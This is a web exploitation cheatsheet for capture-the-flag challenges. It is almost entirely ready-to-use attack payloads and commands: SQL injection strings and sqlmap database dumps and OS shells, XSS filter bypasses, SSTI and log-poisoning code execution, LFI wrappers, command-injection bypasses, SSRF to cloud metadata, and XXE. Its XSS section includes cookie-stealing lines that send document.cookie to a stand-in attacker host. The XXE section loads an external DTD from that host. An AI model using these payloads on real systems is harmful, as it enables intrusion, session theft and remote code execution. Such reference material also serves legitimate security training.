# Web Exploitation Cheatsheet

## First Things to Run (Any Web Challenge)

```bash
# Check headers and response
curl -v http://target/

# Check robots.txt and common files
curl http://target/robots.txt
curl http://target/.git/HEAD
curl http://target/.env
curl http://target/flag.txt
curl http://target/.htaccess

# View source
curl -s http://target/ | head -100

# Check cookies
curl -v http://target/ 2>&1 | grep -i "set-cookie"

# Directory enumeration
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt
dirb http://target/ /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://target/

# Technology detection
whatweb http://target/
```

---

## Directory & File Discovery

### Common Hidden Paths
```bash
# Git exposure
curl http://target/.git/config
curl http://target/.git/HEAD
# Use: https://github.com/internetwache/GitTools

# Backup files
curl http://target/index.php.bak
curl http://target/index.php~
curl http://target/index.php.swp
curl http://target/.index.php.swp

# Config files
curl http://target/config.php
curl http://target/wp-config.php
curl http://target/web.config
curl http://target/.env

# Admin panels
curl http://target/admin
curl http://target/admin.php
curl http://target/administrator
curl http://target/wp-admin
```

### Wordlists
```bash
# Common locations
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/

# Gobuster
gobuster dir -u http://target/ -w wordlist.txt -x php,txt,html,bak

# Ffuf
ffuf -u http://target/FUZZ -w wordlist.txt
ffuf -u http://target/FUZZ -w wordlist.txt -e .php,.txt,.bak
```

---

## SQL Injection

### Detection
```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
' OR 1=1--
1' ORDER BY 1--
1' ORDER BY 100--
```

### UNION-Based
```sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Once you know columns
' UNION SELECT 1,2,3--
' UNION SELECT 1,username,password FROM users--

-- Database enumeration
' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
```

### Blind SQLi - Boolean
```sql
' AND 1=1--     # True
' AND 1=2--     # False
' AND SUBSTRING(username,1,1)='a'--
' AND (SELECT COUNT(*) FROM users)>0--
```

### Blind SQLi - Time
```sql
' AND SLEEP(5)--              # MySQL
' AND pg_sleep(5)--           # PostgreSQL
'; WAITFOR DELAY '0:0:5'--    # MSSQL
```

### Error-Based
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
```

### SQLMap
```bash
# Basic
sqlmap -u "http://target/?id=1"

# POST request
sqlmap -u "http://target/login" --data="user=admin&pass=test"

# With cookie
sqlmap -u "http://target/?id=1" --cookie="session=abc123"

# Dump database
sqlmap -u "http://target/?id=1" --dbs
sqlmap -u "http://target/?id=1" -D dbname --tables
sqlmap -u "http://target/?id=1" -D dbname -T users --dump

# OS shell
sqlmap -u "http://target/?id=1" --os-shell
```

---

## XSS (Cross-Site Scripting)

### Detection
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
<body onload=alert(1)>
```

### Filter Bypass
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x onerror=alert(1)>

<!-- Without parentheses -->
<script>alert`1`</script>
<img src=x onerror=alert`1`>

<!-- Event handlers -->
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<details open ontoggle=alert(1)>

<!-- Breaking out of attributes -->
"><script>alert(1)</script>
'><script>alert(1)</script>
\"><img src=x onerror=alert(1)>
```

### Cookie Stealing
```html
<script>new Image().src='http://attacker/?c='+document.cookie</script>
<script>fetch('http://attacker/?c='+document.cookie)</script>
<img src=x onerror="location='http://attacker/?c='+document.cookie">
```

---

## SSTI (Server-Side Template Injection)

### Detection
```
{{7*7}}     → 49 (Jinja2, Twig)
${7*7}      → 49 (FreeMarker, Thymeleaf)
<%= 7*7 %>  → 49 (ERB)
#{7*7}      → 49 (Pebble)
{{7*'7'}}   → 7777777 (Jinja2)
```

### Jinja2 (Python/Flask)
```python
# Read config
{{config}}
{{config.items()}}

# RCE
{{''.__class__.__mro__[1].__subclasses__()}}
# Find subprocess.Popen index, then execute commands

# Common payload
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

---

## LFI/RFI (File Inclusion)

### Basic LFI
```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=/etc/passwd%00              # Null byte (old PHP)
?page=....\/....\/....\/etc/passwd
```

### PHP Wrappers
```
# Read source code
?page=php://filter/convert.base64-encode/resource=index.php

# RCE via php://input
?page=php://input
POST: <?php system('id'); ?>

# Data wrapper
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### Log Poisoning
```bash
# Poison User-Agent
curl -A "<?php system(\$_GET['c']); ?>" http://target/

# Include log
?page=/var/log/apache2/access.log&c=id
?page=/var/log/nginx/access.log&c=id
```

---

## Command Injection

### Detection
```
; id
| id
|| id
& id
&& id
`id`
$(id)
```

### Bypass Filters
```bash
# Spaces
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd

# Blacklisted commands
c\at /etc/passwd
ca''t /etc/passwd
/bin/ca?t /etc/passwd

# Encoding
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
```

---

## Authentication Bypass

### SQL Injection in Login
```
admin'--
admin'/*
' OR '1'='1'--
' OR 1=1--
admin' OR '1'='1
```

### JWT Attacks
```bash
# None algorithm
# Change header: {"alg":"none"}
# Remove signature

# Weak secret bruteforce
hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
```

---

## SSRF (Server-Side Request Forgery)

### Basic
```
?url=http://127.0.0.1/admin
?url=http://localhost/admin
?url=http://[::1]/admin
?url=http://0.0.0.0/admin
```

### Bypass Filters
```
# Different representations
http://127.1/
http://0x7f.0x0.0x0.0x1/
http://0177.0.0.1/
http://2130706433/  # Decimal

# Cloud metadata
http://169.254.169.254/latest/meta-data/  # AWS
http://metadata.google.internal/           # GCP
```

---

## XXE (XML External Entity)

### Basic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Blind XXE (OOB)
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
  %xxe;
]>
```

---

## Useful Tools

```bash
# Burp Suite - intercept/modify requests
# OWASP ZAP - web app scanner

# SQLMap
sqlmap -u "http://target/?id=1" --dbs

# WFuzz
wfuzz -c -z file,wordlist.txt http://target/FUZZ

# Nikto
nikto -h http://target/

# Nuclei
nuclei -u http://target/
```

---

## Useful One-Liners

```bash
# Send POST request
curl -X POST -d "user=admin&pass=test" http://target/login

# With cookies
curl -b "session=abc123" http://target/

# Follow redirects
curl -L http://target/

# Save response headers
curl -D headers.txt http://target/

# Extract all links from page
curl -s http://target/ | grep -oP 'href="\K[^"]+'

# Test for SQLi
curl "http://target/?id=1'"
curl "http://target/?id=1%27"
```
